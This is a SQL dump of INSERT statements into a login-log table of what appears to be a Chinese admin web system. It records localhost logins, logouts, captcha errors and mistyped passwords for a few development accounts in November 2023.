INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (158, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-02 15:16:27');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (159, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-02 15:17:59');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (160, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-02 19:46:54');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (161, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-03 08:29:25');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (162, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-03 09:39:34');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (163, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-03 10:37:20');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (164, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-03 14:04:16');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (165, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '验证码错误', '2023-11-03 15:44:45');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (166, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-03 15:44:50');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (167, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-04 21:09:01');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (168, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-04 21:24:35');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (169, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-04 21:24:44');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (170, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '验证码错误', '2023-11-04 22:41:58');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (171, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '验证码错误', '2023-11-04 22:42:01');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (172, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-04 22:42:04');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (173, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-05 20:17:38');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (174, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-05 20:18:27');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (175, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '验证码错误', '2023-11-05 20:18:31');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (176, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '验证码错误', '2023-11-05 20:18:42');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (177, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '验证码错误', '2023-11-05 20:18:49');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (178, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '密码输入错误1次', '2023-11-05 20:18:51');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (179, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '用户不存在/密码错误', '2023-11-05 20:18:52');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (180, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-05 20:19:00');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (181, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-05 20:20:46');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (182, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-05 20:20:54');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (183, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-06 08:51:09');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (184, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-06 09:48:34');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (185, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '验证码错误', '2023-11-06 09:48:44');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (186, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-06 09:48:48');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (187, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-06 10:07:05');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (188, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-06 10:07:14');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (189, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-06 10:45:18');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (190, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-06 10:45:23');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (191, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-06 11:13:23');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (192, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-06 11:14:37');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (193, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-06 11:14:47');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (194, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-06 14:04:29');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (195, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-06 14:40:23');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (196, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '验证码错误', '2023-11-06 14:40:29');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (197, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-06 14:40:33');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (198, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-06 15:49:52');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (199, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-06 15:49:58');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (200, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-06 15:50:36');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (201, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-06 15:50:44');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (202, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-06 16:59:07');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (203, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-06 16:59:14');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (204, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-06 17:03:18');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (205, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-06 17:03:28');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (206, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-06 17:03:32');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (207, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-06 17:03:38');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (208, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-06 18:44:22');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (209, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-06 18:47:38');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (210, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-06 18:47:47');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (211, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-06 18:48:42');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (212, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-06 18:48:49');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (213, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-06 20:32:45');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (214, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-06 20:36:47');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (215, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-06 20:36:57');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (216, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-06 20:37:44');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (217, 'xiaoliu', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '验证码错误', '2023-11-06 20:37:50');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (218, 'xiaoliu', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-06 20:37:55');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (219, 'xiaoliu', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-06 20:38:49');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (220, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-06 20:39:02');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (221, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-06 20:42:27');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (222, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-06 20:42:36');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (223, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-07 08:33:33');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (224, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-07 10:22:35');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (225, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '验证码已失效', '2023-11-07 10:26:31');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (226, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '验证码错误', '2023-11-07 10:26:34');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (227, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-07 10:26:37');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (228, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-07 11:04:17');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (229, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-07 11:29:29');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (230, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '密码输入错误1次', '2023-11-07 11:29:39');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (231, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '用户不存在/密码错误', '2023-11-07 11:29:39');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (232, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-07 11:29:46');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (233, 'xiaowang', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-07 14:00:17');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (234, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-07 14:33:07');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (235, 'admin', '127.0.0.1', '内网IP', 'Chrome Mobile', 'Android 6.x', '0', '登录成功', '2023-11-07 15:16:35');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (236, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '1', '密码输入错误1次', '2023-11-07 17:27:04');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (237, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2023-11-07 17:27:04');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (238, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2023-11-07 17:27:14');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (239, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '密码输入错误1次', '2023-11-07 20:01:30');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (240, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '用户不存在/密码错误', '2023-11-07 20:01:30');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (241, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '密码输入错误2次', '2023-11-07 20:01:46');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (242, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '用户不存在/密码错误', '2023-11-07 20:01:46');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (243, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '密码输入错误3次', '2023-11-07 20:02:38');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (244, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '用户不存在/密码错误', '2023-11-07 20:02:38');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (245, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 20:02:52');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (246, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '密码输入错误1次', '2023-11-07 20:38:27');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (247, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '用户不存在/密码错误', '2023-11-07 20:38:27');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (248, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 20:38:37');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (249, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '密码输入错误1次', '2023-11-07 20:38:55');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (250, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '用户不存在/密码错误', '2023-11-07 20:38:55');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (251, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 20:39:04');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (252, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 20:40:26');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (253, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 20:44:02');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (254, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '密码输入错误1次', '2023-11-07 20:46:30');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (255, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '用户不存在/密码错误', '2023-11-07 20:46:30');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (256, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 20:46:36');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (257, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 20:52:09');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (258, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 20:57:50');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (259, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 20:59:59');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (260, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 21:00:23');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (261, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 21:01:03');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (262, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '1', '验证码错误', '2023-11-07 21:02:04');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (263, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 21:02:09');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (264, 'admin', '127.0.0.1', '内网IP', 'Mobile Safari', 'iOS 10 (iPhone)', '0', '登录成功', '2023-11-07 21:07:43');
